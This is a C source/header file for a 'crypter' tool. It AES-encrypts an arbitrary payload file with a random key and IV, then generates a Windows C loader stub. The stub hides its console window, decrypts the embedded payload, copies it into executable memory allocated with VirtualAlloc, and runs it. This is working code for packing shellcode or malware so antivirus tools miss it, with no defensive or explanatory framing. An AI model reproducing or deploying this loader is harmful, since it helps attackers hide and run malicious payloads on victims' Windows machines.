/* DEFINITIONS */
#ifndef CRYPTER_H
#define CRYPTER_H

#define CRYPTER_BLOCK_LENGTH         256
#define CRYPTER_BLOCK_LENGTH_BYTES   CRYPTER_BLOCK_LENGTH/8

#define DEBUG                       1 /* 1=ON  0=OFF */

#include <openssl/rand.h>
#include <unistd.h>

#include "tools/aes/aes.h"
#include "tools/aes/aes.c"

#include "tools/hexdump/hexdump.h"

#include "crypter.h"

const char *CRYPTER_BASE_SOURCE =
    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <string.h>\n"
    "#include <windows.h>\n"
    "#include \"src/tools/aes/aes.h\"\n"
    "#include \"src/tools/aes/aes.c\"\n"
    "unsigned char p[] = \"%s\";\n"
    "unsigned char k[] = \"%s\";\n"
    "unsigned char i[] = \"%s\";\n"
    "void hex2bin(char*h,unsigned char*o,size_t len){"
    "char t[3];int i;for(i=0;i<len/2;++i){memset(t,(char)0x00,3);memcpy(t,h,2);o[i]=(char)strtoul(t,NULL,16);h=h+2;}"
    "}"
    "\nint main(){"
    "FreeConsole();" // REMOVE THIS LINE IF YOU WANT TO SEE THE EXE CONSOLE
    "int pl=strlen(p),kl=strlen(k),il=strlen(i);struct AES_ctx ctx;unsigned char dp[sizeof(p)/2],dk[sizeof(k)/2],di[sizeof(i)/2];hex2bin(p,dp,pl);hex2bin(k,dk,kl);hex2bin(i,di,il);AES_init_ctx_iv(&ctx,dk,di);AES_CBC_decrypt_buffer(&ctx,dp,sizeof(dp));void *e=VirtualAlloc(0,sizeof(dp),MEM_COMMIT,PAGE_EXECUTE_READWRITE);memcpy(e,dp,sizeof(dp));((void(*)())e)();return 0;"
    "}";


typedef struct CrypterPackageCtx
{
    unsigned char *key;
    unsigned char *iv;
    char *infile;

    unsigned char *ciphertext;
    int ciphertext_len;

    char *outfile;
} CrypterPackageCtx;

int CrypterPackageInit(CrypterPackageCtx *ctx, const char *filepath);
unsigned char *CrypterPackageInvoke(CrypterPackageCtx *ctx, const char *outfile);
void CrypterPackageFree(CrypterPackageCtx *ctx);

int CrypterPackageInit(CrypterPackageCtx *ctx, const char *filepath)
{
    ctx->key = (unsigned char*)malloc(CRYPTER_BLOCK_LENGTH_BYTES + 1);
    ctx->iv = (unsigned char*)malloc(CRYPTER_BLOCK_LENGTH_BYTES + 1);
    ctx->infile = (char*)malloc(strlen(filepath) + 1);

    if (ctx->key == NULL || ctx->iv == NULL || ctx->infile == NULL)
    {
        return -1;
    }

    memcpy(ctx->infile, filepath, strlen(filepath));
    ctx->infile[strlen(filepath)] = '\0';

    return 0;
}

unsigned char *CrypterPackageInvoke(CrypterPackageCtx *ctx, const char *outfile)
{
    FILE *stream = fopen(ctx->infile, "rb");

    if (stream == NULL)
    {
        fprintf(stderr, "Failed opening file %s: ", ctx->infile);
        perror(ctx->infile);

        return NULL;
    }

    long fsize;

    fseek(stream, 0, SEEK_END);
    fsize = ftell(stream);

    if (fsize == 0 || fsize < 0) {
        fprintf(stderr, "Failed reading file %s: ", ctx->infile);
        perror("");

        return NULL;
    }

    rewind(stream);

    unsigned char file_contents[fsize]; /* PADDING FOR AES */
    fread(file_contents, fsize, 1, stream);

    printf("Extracted contents of %s\n", ctx->infile);

    #if DEBUG
        printf("\n");
        sleep(1);
        hexdump(file_contents, fsize, 16, 1, 2);
    #endif

    if (RAND_bytes(ctx->key, CRYPTER_BLOCK_LENGTH_BYTES) < 0) {
        fprintf(stderr, "Failed generating random key (RAND_bytes)");

        return NULL;
    }

//  #if DEBUG
        printf("Generated random AES128 Cryto Pack key: ");

        for (int i = 0; i < CRYPTER_BLOCK_LENGTH_BYTES; ++i)
        {
            printf("%02X", ctx->key[i]);
        }

        putchar('\n');

//  #endif

    if (RAND_bytes(ctx->iv, CRYPTER_BLOCK_LENGTH_BYTES) < 0) {
        fprintf(stderr, "Failed generating random initialization vector (RAND_BYTES)");

        return NULL;
    }

//  #if DEBUG
        printf("Generated random initialization vector: ");

        for (int i = 0; i < CRYPTER_BLOCK_LENGTH_BYTES; ++i)
        {
            printf("%02X", ctx->iv[i]);
        }

        putchar('\n');
//  #endif

    struct AES_ctx aes;

    AES_init_ctx_iv(&aes, ctx->key, ctx->iv);
    AES_CBC_encrypt_buffer(&aes, file_contents, fsize);

    #if DEBUG
        printf("Encrypted payload (%s):\n\n", ctx->infile);
        sleep(1);
        hexdump(file_contents, fsize, 16, 1, 1);
    #endif

    printf("Successfully encrypted payload - generating exe file\n\n");

    char encoded_file_contents[fsize * 2];
    char encoded_key[CRYPTER_BLOCK_LENGTH_BYTES * 2 + 1];
    char encoded_iv[CRYPTER_BLOCK_LENGTH_BYTES * 2 + 1];

    for (int i = 0; i < CRYPTER_BLOCK_LENGTH_BYTES; ++i)
    {
        snprintf(encoded_key + i * 2, sizeof(encoded_key), "%02x", ctx->key[i]);
        snprintf(encoded_iv + i * 2, sizeof(encoded_iv), "%02x", ctx->iv[i]);
    }

    for (int i = 0; i < sizeof(file_contents); ++i) {
        snprintf(encoded_file_contents + i * 2, sizeof(encoded_file_contents), "%02x", file_contents[i]);
    }

    if (strlen(encoded_file_contents) != (fsize * 2)) {
        printf("Looks like the full encryption failed as the parity does not match. You can try again to generate different key/IV\n");
    }

    printf("Generated Crypter C source\n");

    #if DEBUG
        printf("\n\n");
        sleep(1);
        printf(CRYPTER_BASE_SOURCE, encoded_file_contents, encoded_key, encoded_iv);
        putchar('\n');
        putchar('\n');
    #endif

    printf("Writing source to %s.c...\n", outfile);

    char source_out[strlen(outfile) + 3];
    snprintf(source_out, sizeof(source_out), "%s.c", outfile);

    FILE *source_stream = fopen(source_out, "wb");

    if (source_stream == NULL)
    {
        fprintf(stderr, "Failed to open file (source) %s: ", source_out);
        perror("");

        return NULL;
    }

    fprintf(source_stream, CRYPTER_BASE_SOURCE, encoded_file_contents, encoded_key, encoded_iv);

    printf("Done\n");
}

void CrypterPackageFree(CrypterPackageCtx *ctx)
{
    if (ctx->key != NULL)
    {
        free(ctx->key);
    }

    if (ctx->iv != NULL)
    {
        free(ctx->iv);
    }

    if (ctx->infile != NULL)
    {
        free(ctx->infile);
    }

    if (ctx->ciphertext != NULL)
    {
        free(ctx->ciphertext);
    }

    if (ctx->outfile != NULL)
    {
        free(ctx->outfile);
    }

    ctx->ciphertext_len = 0;
}

#endif
